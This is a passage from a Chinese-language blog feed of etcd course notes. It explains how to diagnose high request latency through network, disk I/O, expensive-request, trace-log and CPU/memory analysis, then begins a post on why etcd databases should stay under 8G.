class="hljs-operator">=</span><span class="hljs-string">&quot;91bc3c398fb3c146&quot;</span>&#125; <span class="hljs-number">47774</span><br>etcd_network_client_grpc_sent_bytes_total <span class="hljs-number">513207</span><br><br></code></pre></td></tr></table></figure><p>从以上metrics中，你可以看到91bc3c398fb3c146节点出现了异常。在etcd场景中，网络质量导致etcd性能下降主要源自两个方面：</p><p>一方面，expensive request中的大包查询会使网卡出现瓶颈，产生丢包等错误，从而导致etcd吞吐量下降、高延时。expensive request导致网卡丢包，出现超时，这在etcd中是非常典型且易发生的问题，它主要是因为业务没有遵循最佳实践，查询了大量key-value。</p><p>另一方面，在跨故障域部署的时候，故障域可能是可用区、城市。故障域越大，容灾级别越高，但各个节点之间的RTT越高，请求的延时更高。</p><h2 id="磁盘I-x2F-O"><a href="#磁盘I-x2F-O" class="headerlink" title="磁盘I&#x2F;O"></a>磁盘I&#x2F;O</h2><p>了解完网络问题的定位方法和导致网络性能下降的因素后，再看看最核心的磁盘I&#x2F;O。</p><p>正如Raft日志复制整体流程图中介绍的，在etcd中无论是Raft日志持久化还是boltdb事务提交，都依赖于磁盘I&#x2F;O的性能。</p><p><strong>当etcd请求延时出现波动时，我们往往首先关注disk相关指标是否正常。</strong> 我们可以通过etcd磁盘相关的metrics(etcd_disk_wal_fsync_duration_seconds和etcd_disk_backend_commit_duration_seconds)来观测应用层数据写入磁盘的性能。</p><p>etcd_disk_wal_fsync_duration_seconds（简称disk_wal_fsync）表示WAL日志持久化的fsync系统调用延时数据。一般本地SSD盘P99延时在10ms内，如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/9a/52/9a08490980abb23f90d8e59a83543e52.png?wh=1326*352" alt="img"></p><p>etcd_disk_backend_commit_duration_seconds（简称disk_backend_commit）表示后端boltdb事务提交的延时，一般P99在120ms内。</p><p><img src="https://static001.geekbang.org/resource/image/29/db/294600a0a144be38e9d7b69d9403f3db.png?wh=1338*356" alt="img"></p><p>这里需要注意的是，一般监控显示的磁盘延时都是P99，但实际上etcd对磁盘特别敏感，一次磁盘I&#x2F;O波动就可能产生Leader切换。如果遇到集群Leader出现切换、请求超时，但是磁盘指标监控显示正常，可以查看P100确认下是不是由于磁盘I&#x2F;O波动导致的。</p><p>同时etcd的WAL模块在fdatasync操作超过1秒时，也会在etcd中打印如下的日志，你可以结合日志进一步定位。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> took &gt; warnSyncDuration &#123;<br>   <span class="hljs-keyword">if</span> w<span class="hljs-selector-class">.lg</span> != nil &#123;<br>      w<span class="hljs-selector-class">.lg</span><span class="hljs-selector-class">.Warn</span>(<br>         <span class="hljs-string">&quot;slow fdatasync&quot;</span>,<br>         zap<span class="hljs-selector-class">.Duration</span>(<span class="hljs-string">&quot;took&quot;</span>, took),<br>         zap<span class="hljs-selector-class">.Duration</span>(<span class="hljs-string">&quot;expected-duration&quot;</span>, warnSyncDuration),<br>      )<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      plog<span class="hljs-selector-class">.Warningf</span>(<span class="hljs-string">&quot;sync duration of %v, expected less than %v&quot;</span>, took, warnSyncDuration)<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当disk_wal_fsync指标异常的时候，一般是底层硬件出现瓶颈或异常导致。当然也有可能是CPU高负载、cgroup blkio限制导致的，具体应该如何区分呢？</p><p>可以通过iostat、blktrace工具分析瓶颈是在应用层还是内核层、硬件层。其中blktrace是blkio层的磁盘I&#x2F;O分析利器，它可记录IO进入通用块层、IO请求生成插入请求队列、IO请求分发到设备驱动、设备驱动处理完成这一系列操作的时间，帮助你发现磁盘I&#x2F;O瓶颈发生的阶段。</p><p>当disk_backend_commit指标的异常时候，说明事务提交过程中的B+ tree树重平衡、分裂、持久化dirty page、持久化meta page等操作耗费了大量时间。</p><p>disk_backend_commit指标异常，能说明是磁盘I&#x2F;O发生了异常吗？</p><p>若disk_backend_commit较高、disk_wal_fsync却正常，说明瓶颈可能并非来自磁盘I&#x2F;O性能，也许是B+ tree的重平衡、分裂过程中的较高时间复杂度逻辑操作导致。比如etcd目前所有stable版本（etcd 3.2到3.4），从freelist中申请和回收若干连续空闲页的时间复杂度是O(N)，当db文件较大、空闲页碎片化分布的时候，则可能导致事务提交高延时。</p><p>那如何区分事务提交过程中各个阶段的耗时呢？</p><p>etcd还提供了disk_backend_commit_rebalance_duration和disk_backend_commit_spill_duration两个metrics，分别表示事务提交过程中B+ tree的重平衡和分裂操作耗时分布区间。</p><p>最后，需要注意disk_wal_fsync记录的是WAL文件顺序写入的持久化时间，disk_backend_commit记录的是整个事务提交的耗时。后者涉及的磁盘I&#x2F;O是随机的，为了保证你etcd集群的稳定性，建议使用SSD磁盘以确保事务提交的稳定性。</p><h2 id="expensive-request"><a href="#expensive-request" class="headerlink" title="expensive request"></a>expensive request</h2><p>若磁盘和网络指标都很正常，那么延时高还有可能是什么原因引起的呢？</p><p>从读请求链路我们可知，一个读写请求经过Raft模块处理后，最终会走到MVCC模块。那么在MVCC模块会有哪些场景导致延时抖动呢？时间耗在哪个处理流程上了？</p><p>etcd 3.4版本之前，在应用put&#x2F;txn等请求到状态机的apply和处理读请求range流程时，若一个请求执行超过100ms时，默认会在etcd log中打印一条”apply request took too long”的警告日志。通过此日志我们可以知道集群中apply流程产生了较慢的请求，但是不能确定具体是什么因素导致的。</p><p>比如在Kubernetes中，当集群Pod较多的时候，若你频繁执行List Pod，可能会导致etcd出现大量的”apply request took too long”警告日志。</p><p>因为对etcd而言，List Pod请求涉及到大量的key查询，会消耗较多的CPU、内存、网络资源，此类expensive request的QPS若较大，则很可能导致OOM、丢包。</p><p>当然，除了业务发起的expensive request请求导致延时抖动以外，也有可能是etcd本身的设计实现存在瓶颈。</p><p>比如在etcd 3.2和3.3版本写请求完成之前，需要更新MVCC的buffer，进行升级锁操作。然而此时若集群中出现了一个long expensive read request，则会导致写请求执行延时抖动。因为expensive read request事务会一直持有MVCC的buffer读锁，导致写请求事务阻塞在升级锁操作中。</p><p>在了解完expensive request对请求延时的影响后，接下来要如何解决请求延时较高问题的定位效率呢？</p><p>为了提高请求延时分布的可观测性、延时问题的定位效率，etcd社区在3.4版本后中实现了trace特性，详细记录了一个请求在各个阶段的耗时。若某阶段耗时流程超过默认的100ms，则会打印一条trace日志。</p><p>下面是我将trace日志打印的阈值改成1纳秒后读请求执行过程中的trace日志。从日志中你可以看到，trace日志记录了以下阶段耗时：</p><ul><li>agreement among raft nodes before linearized reading，此阶段读请求向Leader发起readIndex查询并等待本地applied index &gt;&#x3D; Leader的committed index， 但是你无法区分是readIndex慢还是等待本地applied index &gt; Leader的committed index慢。在etcd 3.5中新增了trace，区分了以上阶段；</li><li>get authentication metadata，获取鉴权元数据；</li><li>range keys from in-memory index tree，从内存索引B-tree中查找key列表对应的版本号列表；</li><li>range keys from bolt db，根据版本号列表从boltdb遍历，获得用户的key-value信息；</li><li>filter and sort the key-value pairs，过滤、排序key-value列表；</li><li>assemble the response，聚合结果。</li></ul><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;info&quot;</span>，<br>    <span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2020-12-16T08:11:43.720+0800&quot;</span>，<br>    <span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;traceutil/trace.go:145&quot;</span>，<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;trace[789864563] range&quot;</span>，<br>    <span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;&#123;range_begin:a; range_end:; response_count:1; response_revision:32011; &#125;&quot;</span>，<br>    <span class="hljs-string">&quot;duration&quot;</span>:<span class="hljs-string">&quot;318.774µs&quot;</span>，<br>    <span class="hljs-string">&quot;start&quot;</span>:<span class="hljs-string">&quot;2020-12-16T08:11:43.719+0800&quot;</span>，<br>    <span class="hljs-string">&quot;end&quot;</span>:<span class="hljs-string">&quot;2020-12-16T08:11:43.720+0800&quot;</span>，<br>    <span class="hljs-string">&quot;steps&quot;</span>:[<br>        <span class="hljs-string">&quot;trace[789864563] &#x27;</span>agreement among raft nodes before linearized reading<span class="hljs-string">&#x27;  (duration: 255.227µs)&quot;</span>，<br>        <span class="hljs-string">&quot;trace[789864563] &#x27;</span>get authentication metadata<span class="hljs-string">&#x27;  (duration: 2.97µs)&quot;</span>，<br>        <span class="hljs-string">&quot;trace[789864563] &#x27;</span>range keys from in-memory index tree<span class="hljs-string">&#x27;  (duration: 44.578µs)&quot;</span>，<br>        <span class="hljs-string">&quot;trace[789864563] &#x27;</span>range keys from bolt db<span class="hljs-string">&#x27;  (duration: 8.688µs)&quot;</span>，<br>        <span class="hljs-string">&quot;trace[789864563] &#x27;</span>filter and sort the key-value pairs<span class="hljs-string">&#x27;  (duration: 578ns)&quot;</span>，<br>        <span class="hljs-string">&quot;trace[789864563] &#x27;</span>assemble the response<span class="hljs-string">&#x27;  (duration: 643ns)&quot;</span><br>    ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>那么写请求流程会记录哪些阶段耗时呢？</p><p>下面是put写请求的执行trace日志，记录了以下阶段耗时：</p><ul><li>process raft request，写请求提交到Raft模块处理完成耗时；</li><li>get key’s previous created_revision and leaseID，获取key上一个创建版本号及leaseID的耗时；</li><li>marshal mvccpb.KeyValue，序列化KeyValue结构体耗时；</li><li>store kv pair into bolt db，存储kv数据到boltdb的耗时；</li><li>attach lease to kv pair，将lease id关联到kv上所用时间。</li></ul><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;info&quot;</span>，<br>    <span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2020-12-16T08:25:12.707+0800&quot;</span>，<br>    <span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;traceutil/trace.go:145&quot;</span>，<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;trace[1402827146] put&quot;</span>，<br>    <span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;&#123;key:16; req_size:8; response_revision:32030; &#125;&quot;</span>，<br>    <span class="hljs-string">&quot;duration&quot;</span>:<span class="hljs-string">&quot;6.826438ms&quot;</span>，<br>    <span class="hljs-string">&quot;start&quot;</span>:<span class="hljs-string">&quot;2020-12-16T08:25:12.700+0800&quot;</span>，<br>    <span class="hljs-string">&quot;end&quot;</span>:<span class="hljs-string">&quot;2020-12-16T08:25:12.707+0800&quot;</span>，<br>    <span class="hljs-string">&quot;steps&quot;</span>:[<br>        <span class="hljs-string">&quot;trace[1402827146] &#x27;</span>process raft request<span class="hljs-string">&#x27;  (duration: 6.659094ms)&quot;</span>，<br>        <span class="hljs-string">&quot;trace[1402827146] &#x27;</span>get key<span class="hljs-string">&#x27;s previous created_revision and leaseID&#x27;</span>  (duration: <span class="hljs-number">23.498</span>µs)<span class="hljs-string">&quot;，</span><br><span class="hljs-string">        &quot;</span>trace[<span class="hljs-number">1402827146</span>] <span class="hljs-string">&#x27;marshal mvccpb.KeyValue&#x27;</span>  (duration: <span class="hljs-number">1.857</span>µs)<span class="hljs-string">&quot;，</span><br><span class="hljs-string">        &quot;</span>trace[<span class="hljs-number">1402827146</span>] <span class="hljs-string">&#x27;store kv pair into bolt db&#x27;</span>  (duration: <span class="hljs-number">30.121</span>µs)<span class="hljs-string">&quot;，</span><br><span class="hljs-string">        &quot;</span>trace[<span class="hljs-number">1402827146</span>] <span class="hljs-string">&#x27;attach lease to kv pair&#x27;</span>  (duration: <span class="hljs-number">661</span>ns)<span class="hljs-string">&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>通过以上介绍的trace特性，就可以快速定位到高延时读写请求的原因。比如向etcd发起了一个涉及到大量key或value较大的expensive request请求的时候，它会产生如下的warn和trace日志。</p><p>从以下日志中可以看到，此请求查询的vip前缀下所有的kv数据总共是250条，但是涉及的数据包大小有250MB，总耗时约1.85秒，其中从boltdb遍历key消耗了1.63秒。</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs d">&#123;<br>    <span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;warn&quot;</span>，<br>    <span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2020-12-16T23:02:53.324+0800&quot;</span>，<br>    <span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;etcdserver/util.go:163&quot;</span>，<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;apply request took too long&quot;</span>，<br>    <span class="hljs-string">&quot;took&quot;</span>:<span class="hljs-string">&quot;1.84796759s&quot;</span>，<br>    <span class="hljs-string">&quot;expected-duration&quot;</span>:<span class="hljs-string">&quot;100ms&quot;</span>，<br>    <span class="hljs-string">&quot;prefix&quot;</span>:<span class="hljs-string">&quot;read-only range &quot;</span>，<br>    <span class="hljs-string">&quot;request&quot;</span>:<span class="hljs-string">&quot;key:&quot;</span>vip<span class="hljs-string">&quot; range_end:&quot;</span>vi<span class="hljs-string">q&quot; &quot;</span>，<br>    <span class="hljs-string">&quot;response&quot;</span>:<span class="hljs-string">&quot;range_response_count:250 size:262150651&quot;</span><br>&#125;<br>&#123;<br>    <span class="hljs-string">&quot;level&quot;</span>:<span class="hljs-string">&quot;info&quot;</span>，<br>    <span class="hljs-string">&quot;ts&quot;</span>:<span class="hljs-string">&quot;2020-12-16T23:02:53.324+0800&quot;</span>，<br>    <span class="hljs-string">&quot;caller&quot;</span>:<span class="hljs-string">&quot;traceutil/trace.go:145&quot;</span>，<br>    <span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;trace[370341530] range&quot;</span>，<br>    <span class="hljs-string">&quot;detail&quot;</span>:<span class="hljs-string">&quot;&#123;range_begin:vip; range_end:viq; response_count:250; response_revision:32666; &#125;&quot;</span>，<br>    <span class="hljs-string">&quot;duration&quot;</span>:<span class="hljs-string">&quot;1.850335038s&quot;</span>，<br>    <span class="hljs-string">&quot;start&quot;</span>:<span class="hljs-string">&quot;2020-12-16T23:02:51.473+0800&quot;</span>，<br>    <span class="hljs-string">&quot;end&quot;</span>:<span class="hljs-string">&quot;2020-12-16T23:02:53.324+0800&quot;</span>，<br>    <span class="hljs-string">&quot;steps&quot;</span>:[<br>        <span class="hljs-string">&quot;trace[370341530] &#x27;range keys from bolt db&#x27;  (duration: 1.632336981s)&quot;</span><br>    ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后，有两个注意事项。</p><p>第一，在etcd 3.4中，logger默认为capnslog，trace特性只有在当logger为zap时才开启，因此你需要设置–logger&#x3D;zap。</p><p>第二，trace特性并不能记录所有类型的请求，它目前只覆盖了MVCC模块中的range&#x2F;put&#x2F;txn等常用接口。像Authenticate鉴权请求，涉及到大量CPU计算，延时是非常高的，在trace日志中目前没有相关记录。</p><p>如果开启了密码鉴权，在连接数增多、QPS增大后，若突然出现请求超时，如何确定是鉴权还是查询、更新等接口导致的呢？</p><p>etcd默认参数并不会采集各个接口的延时数据，可以通过设置etcd的启动参数–metrics为extensive来开启，获得每个gRPC接口的延时数据。同时可结合各个gRPC接口的请求数，获得QPS。</p><p>如下是某节点的metrics数据，251个Put请求，返回码OK，其中有240个请求在100毫秒内完成。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grpc_server_handled_total&#123;grpc_code<span class="hljs-operator">=</span><span class="hljs-string">&quot;OK&quot;</span>，<br>grpc_method<span class="hljs-operator">=</span><span class="hljs-string">&quot;Put&quot;</span>，grpc_service<span class="hljs-operator">=</span><span class="hljs-string">&quot;etcdserverpb.KV&quot;</span>，<br>grpc_type<span class="hljs-operator">=</span><span class="hljs-string">&quot;unary&quot;</span>&#125; <span class="hljs-number">251</span><br><br>grpc_server_handling_seconds_bucket&#123;grpc_method<span class="hljs-operator">=</span><span class="hljs-string">&quot;Put&quot;</span>，grpc_service<span class="hljs-operator">=</span><span class="hljs-string">&quot;etcdserverpb.KV&quot;</span>，grpc_type<span class="hljs-operator">=</span><span class="hljs-string">&quot;unary&quot;</span>，le<span class="hljs-operator">=</span><span class="hljs-string">&quot;0.005&quot;</span>&#125; <span class="hljs-number">0</span><br>grpc_server_handling_seconds_bucket&#123;grpc_method<span class="hljs-operator">=</span><span class="hljs-string">&quot;Put&quot;</span>，grpc_service<span class="hljs-operator">=</span><span class="hljs-string">&quot;etcdserverpb.KV&quot;</span>，grpc_type<span class="hljs-operator">=</span><span class="hljs-string">&quot;unary&quot;</span>，le<span class="hljs-operator">=</span><span class="hljs-string">&quot;0.01&quot;</span>&#125; <span class="hljs-number">1</span><br>grpc_server_handling_seconds_bucket&#123;grpc_method<span class="hljs-operator">=</span><span class="hljs-string">&quot;Put&quot;</span>，grpc_service<span class="hljs-operator">=</span><span class="hljs-string">&quot;etcdserverpb.KV&quot;</span>，grpc_type<span class="hljs-operator">=</span><span class="hljs-string">&quot;unary&quot;</span>，le<span class="hljs-operator">=</span><span class="hljs-string">&quot;0.025&quot;</span>&#125; <span class="hljs-number">51</span><br>grpc_server_handling_seconds_bucket&#123;grpc_method<span class="hljs-operator">=</span><span class="hljs-string">&quot;Put&quot;</span>，grpc_service<span class="hljs-operator">=</span><span class="hljs-string">&quot;etcdserverpb.KV&quot;</span>，grpc_type<span class="hljs-operator">=</span><span class="hljs-string">&quot;unary&quot;</span>，le<span class="hljs-operator">=</span><span class="hljs-string">&quot;0.05&quot;</span>&#125; <span class="hljs-number">204</span><br>grpc_server_handling_seconds_bucket&#123;grpc_method<span class="hljs-operator">=</span><span class="hljs-string">&quot;Put&quot;</span>，grpc_service<span class="hljs-operator">=</span><span class="hljs-string">&quot;etcdserverpb.KV&quot;</span>，grpc_type<span class="hljs-operator">=</span><span class="hljs-string">&quot;unary&quot;</span>，le<span class="hljs-operator">=</span><span class="hljs-string">&quot;0.1&quot;</span>&#125; <span class="hljs-number">240</span><br><br></code></pre></td></tr></table></figure><h2 id="集群容量、节点CPU-x2F-Memory瓶颈"><a href="#集群容量、节点CPU-x2F-Memory瓶颈" class="headerlink" title="集群容量、节点CPU&#x2F;Memory瓶颈"></a>集群容量、节点CPU&#x2F;Memory瓶颈</h2><p>介绍完网络、磁盘I&#x2F;O、expensive request导致etcd请求延时较高的原因和分析方法后，我们再看看容量和节点资源瓶颈是如何导致高延时请求产生的。</p><p>若网络、磁盘I&#x2F;O正常，也无expensive request，那此时高延时请求是怎么产生的呢？它的trace日志会输出怎样的耗时结果？</p><p>下面是一个社区用户反馈的一个读接口高延时案例的两条trace日志。从第一条日志中我们可以知道瓶颈在于线性读的准备步骤，readIndex和wait applied index。</p><p>那么是其中具体哪个步骤导致的高延时呢？通过在etcd 3.5版本中细化此流程，我们获得了第二条日志，发现瓶颈在于等待applied index &gt;&#x3D; Leader的committed index。</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">&#123;<br><span class="hljs-comment">&quot;level&quot;</span>: <span class="hljs-comment">&quot;info&quot;</span>，<br><span class="hljs-comment">&quot;ts&quot;</span>: <span class="hljs-comment">&quot;2020-08-12T08:24:56.181Z&quot;</span>，<br><span class="hljs-comment">&quot;caller&quot;</span>: <span class="hljs-comment">&quot;traceutil/trace.go:145&quot;</span>，<br><span class="hljs-comment">&quot;msg&quot;</span>: <span class="hljs-comment">&quot;trace[677217921] range&quot;</span>，<br><span class="hljs-comment">&quot;detail&quot;</span>: <span class="hljs-comment">&quot;&#123;range_begin:/...redacted...; range_end:; response_count:1; response_revision:2725080604; &#125;&quot;</span>，<br><span class="hljs-comment">&quot;duration&quot;</span>: <span class="hljs-comment">&quot;1.553047811s&quot;</span>，<br><span class="hljs-comment">&quot;start&quot;</span>: <span class="hljs-comment">&quot;2020-08-12T08:24:54.628Z&quot;</span>，<br><span class="hljs-comment">&quot;end&quot;</span>: <span class="hljs-comment">&quot;2020-08-12T08:24:56.181Z&quot;</span>，<br><span class="hljs-comment">&quot;steps&quot;</span>: [<br><span class="hljs-comment">&quot;trace[677217921] &#x27;agreement among raft nodes before linearized reading&#x27;  (duration: 1.534322015s)&quot;</span><br>]<br>&#125;<br><br>&#123;<br>  <span class="hljs-comment">&quot;level&quot;</span>: <span class="hljs-comment">&quot;info&quot;</span>，<br>  <span class="hljs-comment">&quot;ts&quot;</span>: <span class="hljs-comment">&quot;2020-09-22T12:54:01.021Z&quot;</span>，<br>  <span class="hljs-comment">&quot;caller&quot;</span>: <span class="hljs-comment">&quot;traceutil/trace.go:152&quot;</span>，<br>  <span class="hljs-comment">&quot;msg&quot;</span>: <span class="hljs-comment">&quot;trace[2138445431] linearizableReadLoop&quot;</span>，<br>  <span class="hljs-comment">&quot;detail&quot;</span>: <span class="hljs-comment">&quot;&quot;</span>，<br>  <span class="hljs-comment">&quot;duration&quot;</span>: <span class="hljs-comment">&quot;855.447896ms&quot;</span>，<br>  <span class="hljs-comment">&quot;start&quot;</span>: <span class="hljs-comment">&quot;2020-09-22T12:54:00.166Z&quot;</span>，<br>  <span class="hljs-comment">&quot;end&quot;</span>: <span class="hljs-comment">&quot;2020-09-22T12:54:01.021Z&quot;</span>，<br>  <span class="hljs-comment">&quot;steps&quot;</span>: [<br>    <span class="hljs-comment">&quot;trace[2138445431] read index received  (duration: 824.408µs)&quot;</span>，<br>    <span class="hljs-comment">&quot;trace[2138445431] applied index is now lower than readState.Index  (duration: 854.622058ms)&quot;</span><br>  ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>为什么会发生这样的现象呢?</p><p>首先可以通过etcd_server_slow_apply_total指标，观查其值快速增长的时间点与高延时请求产生的日志时间点是否吻合。</p><p>其次检查是否存在大量写请求。线性读需确保本节点数据与Leader数据一样新， 若本节点的数据与Leader差异较大，本节点追赶Leader数据过程会花费一定时间，最终导致高延时的线性读请求产生。</p><p><strong>etcd适合读多写少的业务场景，若写请求较大，很容易出现容量瓶颈，导致高延时的读写请求产生。</strong></p><p>最后通过ps&#x2F;top&#x2F;mpstat&#x2F;perf等CPU、Memory性能分析工具，检查etcd节点是否存在CPU、Memory瓶颈。goroutine饥饿、内存不足都会导致高延时请求产生，若确定CPU和Memory存在异常，你可以通过开启debug模式，通过pprof分析CPU和内存瓶颈点。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>如下图所示，从以下几个方面介绍了会导致请求延时上升的原因：</p><ul><li>网络质量，如节点之间RTT延时、网卡带宽满，出现丢包；</li><li>磁盘I&#x2F;O抖动，会导致WAL日志持久化、boltdb事务提交出现抖动，Leader出现切换等；</li><li>expensive request，比如大包请求、涉及到大量key遍历、Authenticate密码鉴权等操作；</li><li>容量瓶颈，太多写请求导致线性读请求性能下降等；</li><li>节点配置，CPU繁忙导致请求处理延时、内存不够导致swap等。</li></ul><p><img src="https://static001.geekbang.org/resource/image/93/a3/9375f08cebd596b87b92623c10786fa3.png?wh=1920*1474" alt="img"></p><p>并在分析这些案例的过程中，给你介绍了etcd问题核心工具：metrics、etcd log、trace日志、blktrace、pprof等。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>13.db大小：为什么etcd社区建议db大小不超过8G？</title>
    <link href="/2022/10/07/13-db%E5%A4%A7%E5%B0%8F%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88etcd%E7%A4%BE%E5%8C%BA%E5%BB%BA%E8%AE%AEdb%E5%A4%A7%E5%B0%8F%E4%B8%8D%E8%B6%85%E8%BF%878G%EF%BC%9F/"/>
    <url>/2022/10/07/13-db%E5%A4%A7%E5%B0%8F%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88etcd%E7%A4%BE%E5%8C%BA%E5%BB%BA%E8%AE%AEdb%E5%A4%A7%E5%B0%8F%E4%B8%8D%E8%B6%85%E8%BF%878G%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="13-db大小：为什么etcd社区建议db大小不超过8G？"><a href="#13-db大小：为什么etcd社区建议db大小不超过8G？" class="headerlink" title="13.db大小：为什么etcd社区建议db大小不超过8G？"></a>13.db大小：为什么etcd社区建议db大小不超过8G？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>在写流程中分享了etcd Quota模块，那么etcd为什么需要对db增加Quota限制，以及不建议etcd集群db大小超过8G呢？ 过大的db文件对集群性能和稳定性有哪些影响？</p><p>今天分享的主题就是关于db大小。将通过一个大数据量的etcd集群为案例，剖析etcd db大小配额限制背后的设计思考和过大的db潜在隐患。</p><p>帮助理解大数据量对集群的各个模块的影响，配置合理的db Quota值。同时，帮助在实际业务场景中，遵循最佳实践，尽量减少value大小和大key-value更新频率，避免db文件大小不断增长。</p><h2 id="分析整体思路"><a href="#分析整体思路" class="headerlink" title="分析整体思路"></a>分析整体思路</h2><p>首先写入大量数据，构造一个db大小为14G的大集群。然后通过此集群分析db大小的各个影响面，db大小影响面如下图所示。</p><p><img src="https://static001.geekbang.org/resource/image/ab/11/ab657951310461c835963c38e43fdc11.png?wh=1920*685" alt="img"></p><p>首先是 <strong>启动耗时</strong>。etcd启动的时候，需打开boltdb db文件，读取db文件所有key-value数据，用于重建内存treeIndex模块。因此在大量key导致db文件过大的场景中，这会导致etcd启动较慢。</p><p>其次是 <strong>节点内存配置</strong>。etcd在启动的时候会通过mmap将db文件映射内存中，若节点可用内存不足，小于db文件大小时，可能会出现缺页文件中断，导致服务稳定性、性能下降。</p><p>接着是 <strong>treeIndex</strong> 索引性能。因etcd不支持数据分片，内存中的treeIndex若保存了几十万到上千万的key，这会增加查询、修改操作的整体延时。</p><p>然后是 <strong>boltdb性能</strong>。大db文件场景会导致事务提交耗时增长、抖动。</p><p>再次是 <strong>集群稳定性</strong>。大db文件场景下，无论你是百万级别小key还是上千个大value场景，一旦出现expensive request后，很容易导致etcd OOM、节点带宽满而丢包。</p><p>最后是 <strong>快照。</strong> 当Follower节点落后Leader较多数据的时候，会触发Leader生成快照重建发送给Follower节点，Follower基于它进行还原重建操作。较大的db文件会导致Leader发送快照需要消耗较多的CPU、网络带宽资源，同时Follower节点重建还原慢。</p><h2 id="构造大集群"><a href="#构造大集群" class="headerlink" title="构造大集群"></a>构造大集群</h2><p>简单介绍完db大小的六个影响面后，我们下面来构造一个大数据量的集群，用于后续各个影响面的分析。</p><p>首先，我通过一系列如下 <a href="https://github.com/etcd-io/etcd/tree/v3.4.9/tools/benchmark">benchmark</a> 